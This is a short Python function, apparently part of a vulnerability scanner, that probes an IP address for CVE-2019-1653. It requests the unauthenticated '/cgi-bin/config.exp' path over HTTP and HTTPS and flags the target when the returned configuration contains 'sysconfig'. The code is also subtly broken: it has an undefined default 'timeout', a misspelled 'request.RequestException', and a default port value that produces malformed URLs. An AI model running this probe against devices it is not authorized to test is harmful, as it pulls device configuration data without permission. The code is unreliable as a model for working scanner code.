import requests
from lib.headers.headers_handler import user_agents
from lib.color_handler import print_green, print_blue, print_red, print_yellow

def check_CVE_2019_1653(ip, ports=None, timeout=timeout):
	headers = {"User-Agent": user_agents()}
	path = "/cgi-bin/config.exp"
	protocols = ["http", "https"]
	if ports is None:
		ports = [80]
	else:
		ports = [f":{port}" for port in ports]
	for protocol in protocols:
		for port in ports:
			url = f"{protocol}://{ip}{port}{path}"
			try:
				response = requests.get(url, verify=False, timeout=timeout, headers=headers)
				if "sysconfig" in response.text:
					print_green(f"The target is vulnerable to CVE-2019-1653 : {url}")
					return True
			except request.RequestException:
				continue
	return False